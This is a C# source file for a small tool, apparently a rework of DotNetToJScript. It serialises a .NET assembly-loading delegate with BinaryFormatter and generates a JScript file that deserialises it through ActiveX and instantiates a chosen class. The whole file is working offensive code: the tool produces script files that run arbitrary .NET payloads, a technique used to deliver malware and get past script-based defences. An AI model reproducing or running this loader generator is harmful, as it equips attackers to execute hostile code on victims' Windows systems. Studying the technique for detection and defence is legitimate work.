using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.Remoting.Messaging;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Xml.Schema;

namespace DotNetToJScriptMini
{
    class Program
    {
        /// 
        /// Assembly functions
        ///
        static object BuildLoaderDelegate(byte[] assembly)
        {
            Console.WriteLine($" -> Delegate");
            Console.WriteLine("     " + typeof(XmlValueGetter));
            Console.WriteLine("     " + typeof(Assembly).GetMethod("Load", new Type[] { typeof(byte[]) }));

            // Create a bound delegate which will load our assembly from a byte array.
            // Delegate.CreateDelegate(Type, Object, Type)
            // https://docs.microsoft.com/en-us/dotnet/api/system.delegate.createdelegate?view=net-5.0
            // https://docs.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/how-to-hook-up-a-delegate-using-reflection
            // https://github.com/TheWover/beercode/blob/master/loaders/DeserializeAssembly.cs010
            Delegate res = Delegate.CreateDelegate(
                typeof(XmlValueGetter), 
                assembly,
                typeof(Assembly).GetMethod("Load", new Type[] { typeof(byte[]) }) // Equeals: System.Reflection.Assembly.Assembly.Load()
                );

            // Create a COM invokable delegate to call the loader. Abuses contra-variance
            // to make an array of headers to an array of objects (which we'll just pass
            // null to anyway).
            Console.WriteLine($" -> Create a COM inovkable delegate to call the loader");
            return new HeaderHandler(res.DynamicInvoke);
        }


        ///
        /// JScript Generation
        ///         
        static string generateScript(byte[] serialized_object, string entry_class_name)
        {
            string[] lines = BinToBase64Lines(serialized_object);
            var encoded_serialized_object = String.Join("+" + Environment.NewLine, lines);


            string functions =
            "function setversion() {\n" +
            "    var shell = new ActiveXObject('WScript.Shell');\n" +
            "    ver = 'v4.0.30319';\n" +
            "    try {\n" +
            "        shell.RegRead('HKLM\\\\SOFTWARE\\\\Microsoft\\\\.NETFramework\\\\v4.0.30319\\\\');\n" +
            "    } catch(e) { \n" +
            "        ver = 'v2.0.50727';\n" +
            "    }\n" +
            "    shell.Environment('Process')('COMPLUS_Version') = ver;\n" +
            "}" +
            "\n\n" +
            "function debug(s) {}\n" +
            "function base64ToStream(b) {\n" +
            "    var enc = new ActiveXObject(\"System.Text.ASCIIEncoding\");\n" +
            "    var length = enc.GetByteCount_2(b);\n" +
            "    var ba = enc.GetBytes_4(b);\n" +
            "    var transform = new ActiveXObject(\"System.Security.Cryptography.FromBase64Transform\");\n" +
            "    ba = transform.TransformFinalBlock(ba, 0, length);\n" +
            "    var ms = new ActiveXObject(\"System.IO.MemoryStream\");\n" +
            "    ms.Write(ba, 0, (length / 4) * 3);\n" +
            "    ms.Position = 0;\n" +
            "    return ms;\n" +
            "}" +
            "\n\n" +
            $"var serialized_obj = {encoded_serialized_object};\n" +
            $"var entry_class = '{entry_class_name}';" +
            "\n\n" +
            "try {\n" +
            "    setversion();\n" +
            "    var stm = base64ToStream(serialized_obj);\n" +
            "    var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');\n" +
            "    var al = new ActiveXObject('System.Collections.ArrayList');\n" +
            "    var d = fmt.Deserialize_2(stm);\n" +
            "    al.Add(undefined);\n" +
            "    var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);" +
            "    \n\n" +
            "} catch (e) {\n" +
            "    debug(e.message);\n" +
            "}\n\n";


            return functions;
        }


        /// 
        /// Helper functions 
        /// 
        public static string[] BinToBase64Lines(byte[] serialized_object)
        {
            int ofs = serialized_object.Length % 3;
            if (ofs != 0)
            {
                int length = serialized_object.Length + (3 - ofs);
                Array.Resize(ref serialized_object, length);
            }

            string base64 = Convert.ToBase64String(serialized_object, Base64FormattingOptions.InsertLineBreaks);
            var b64Formated = base64.Split(new string[] { Environment.NewLine }, StringSplitOptions.None).Select(s => String.Format("\"{0}\"", s)).ToArray();

            return b64Formated;
        }

        static void Summary(string asm = "", string cls = "", string output = "")
        {
            Console.WriteLine("\n=[ Summary ]==================");
            Console.WriteLine($" Assembly        : {asm}");
            Console.WriteLine($" Entry class name: {cls}");
            Console.WriteLine($" Output JS file  : {output}");
            Console.WriteLine("==============================\n");
        }

        static HashSet<string> GetValidClasses(byte[] assembly)
        {            
            Assembly asm = Assembly.Load(assembly);
            var validClasses = new HashSet<string>(asm.GetTypes().Where(t => t.IsPublic && t.GetConstructor(new Type[0]) != null).Select(t => t.FullName));
            return validClasses;
        }

        static void Main(string[] args)
        {
            string assembly_path;
            string entryClassName;
            string outputJS;
            var myname = System.AppDomain.CurrentDomain.FriendlyName;

            if (args.Length == 3)
            {
                assembly_path  = args[0];
                entryClassName = args[1];
                outputJS       = Path.GetFileNameWithoutExtension(args[2]) + ".js";
            }
            else if (args.Length == 2)
            {
                assembly_path  = args[0];
                entryClassName = args[1];
                outputJS       = Path.GetFileNameWithoutExtension(assembly_path) + ".js";
            }
            else if (args.Length == 1)
            {
                assembly_path  = args[0];
                entryClassName = "TestClass";
                outputJS       = Path.GetFileNameWithoutExtension(assembly_path) + ".js";
            }
            else
            {
                Console.WriteLine("[*] Usage:");
                Console.WriteLine($"{myname} <ASSEMBLY> <CLASSNAME> [OUTPUTJS]\n");
                return;
            }

            Summary(assembly_path, entryClassName, outputJS);

            if (!File.Exists(assembly_path))
            {
                Console.Error.WriteLine($"[x] Error: File not found! {assembly_path}");
                Console.WriteLine($"{myname} <ASSEMBLY> <CLASSNAME> [OUTPUTJS]\n");
                Environment.Exit(1);
            }

            // Read the binary
            byte[] assembly = File.ReadAllBytes(assembly_path);

            // Try to find the entry class or enumerate all public classes
            try
            {
                HashSet<string> valid_classes = GetValidClasses(assembly);
                if (!valid_classes.Contains(entryClassName))
                {
                    Console.Error.WriteLine($"[x] Error: Class '{entryClassName}' not found in assembly.");
                    if (valid_classes.Count == 0)
                    {
                        Console.Error.WriteLine($"[x] Error: Assembly doesn't contain any public, default constructable classes");
                    }
                    else
                    {
                        Console.Error.WriteLine($"[!] Use one of the following valid classes from the binary as a second arguement:");
                        foreach (string name in valid_classes)
                        {
                            Console.Error.WriteLine($"    - {name}");
                        }

                        Console.WriteLine($"\n{myname} <ASSEMBLY> <CLASSNAME> [OUTPUTJS]\n");
                    }
                    Environment.Exit(1);
                }
            }
            catch (Exception e)
            {
                Console.Error.WriteLine($"[x] Error: loading assembly information.");
                Console.WriteLine(e);
                Environment.Exit(1);
            }

            Console.WriteLine($"[+] Found a valid class '{entryClassName}'");
            // Serialize an object
            BinaryFormatter formatter = new BinaryFormatter();
            // To serialize xxxx object you must first open a stream for writing.
            MemoryStream memoryStream = new MemoryStream();
            Console.WriteLine($"[+] Serilizing the assembly object");
            formatter.Serialize(memoryStream, BuildLoaderDelegate(assembly));

            Console.WriteLine($"[+] Generating JS file '{outputJS}'");
            string jScriptCode = generateScript(memoryStream.ToArray(), entryClassName);
            File.WriteAllText(outputJS, jScriptCode, new UTF8Encoding(false));
        }
    }
}
